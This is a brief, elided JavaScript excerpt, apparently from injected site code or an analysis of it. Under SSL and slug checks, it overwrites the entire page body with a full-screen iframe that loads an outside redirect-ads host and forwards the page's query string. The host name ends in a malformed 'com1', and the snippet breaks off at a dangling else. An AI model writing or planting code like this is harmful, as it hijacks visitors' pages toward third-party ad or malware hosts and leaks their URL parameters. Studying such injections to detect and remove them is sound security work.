...
if(isSSl) {
    ...
    if(slug)
        document.body.innerHTML = '<iframe width="100%" height="100%" src="https://geoip.redirect-ads.com1/' + document.location.search + '" frameborder="0" scrolling="0" allowfullscreen></iframe>'
    else
